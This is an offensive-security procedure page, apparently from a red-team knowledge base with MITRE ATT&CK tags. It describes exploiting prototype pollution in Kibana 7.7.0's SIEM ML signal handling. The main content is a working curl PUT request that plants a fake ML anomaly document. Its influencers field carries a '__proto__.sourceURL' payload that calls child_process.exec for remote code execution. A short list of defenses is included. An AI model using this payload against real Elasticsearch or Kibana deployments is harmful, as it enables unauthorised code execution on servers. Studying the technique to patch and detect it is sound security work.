---
tags:
  - prototype-pollution
  - ml-anomaly
  - elasticsearch
type: procedure
tools:
  - '[[tools/Elasticsearch-API]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/elasticsearch-put-ml-anomaly]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:23:35.964Z'
sub_techniques: []
id: a52099fb-57f4-4c18-8c70-e9a0e1c41d55
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploitation for Client Execution]]'
---
---

# Create-Fake-ML-Anomaly-for-Prototype-Pollution

## Summary

This procedure creates a fake ML anomaly document in Elasticsearch, embedding a prototype pollution payload in the influencers field to execute arbitrary JavaScript when processed by the SIEM rule.

## Description

By indexing a document into the .ml-anomalies-custom-* index with a malicious influencers array (e.g., 'foo.__proto__.sourceURL' key), the procedure pollutes Object.prototype. When the SIEM rule evaluates it in bulk_create_ml_signals.ts (line 58), the unsanitized fields trigger Node.js code execution. Targets Kibana 7.7.0 with ML features; requires write access to indices. Outcome: Prototype polluted, ready for RCE on rule trigger.

## Requirements

1. Write access to Elasticsearch indices like .ml-anomalies-custom-linux_anomalous_network_activity_ecs
2. Network access to Elasticsearch API (port 9200)
3. Timestamp aligned to rule's 30-hour lookback

## Defense

Defensive measures and detection strategies:

- Sanitize influencer fields in ML processing code
- Restrict write access to ML anomaly indices
- Log and alert on unusual PUTs to .ml-anomalies-* indices

## Objectives

1. Simulate a legitimate ML anomaly with pollution payload
2. Exploit lack of validation in SIEM signal creation
3. Enable RCE via JavaScript execution in Node.js

## Instructions

### Step 1: Index Malicious Anomaly

**Context**: Send a PUT request to create the document with result_type 'record' and polluted influencers.

**Command** ([[commands/elasticsearch-put-ml-anomaly]]):
```bash
curl -X PUT "localhost:9200/.ml-anomalies-custom-linux_anomalous_network_activity_ecs/_doc/my-anomaly?refresh" -H "Content-Type: application/json" -d '{"timestamp": 1588093630045, "result_type": "record", "record_score": 1, "job_id": "linux_anomalous_network_activity_ecs", "by_field_name": "field_name", "by_field_value": "field_value", "influencers": [{"influencer_field_name": "foo.__proto__.sourceURL", "influencer_field_values": "\u2028\u2029\n;global.process.mainModule.require('child_process').exec('say pwned && open https://www.youtube.com/watch?v=LUsiFV3dsK8')"}]}'
```

> Adjust timestamp for lookback. Expected output: {"_index": ".ml-anomalies-custom-linux_anomalous_network_activity_ecs", "_id": "my-anomaly", "result": "created"}.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]
- [[Exploitation for Client Execution]]

### Sub-Techniques


## Commands Used

- [[commands/elasticsearch-put-ml-anomaly]]

## Tools Used

- [[tools/Elasticsearch-API]]

## Tags

- prototype-pollution
- ml-anomaly
- elasticsearch

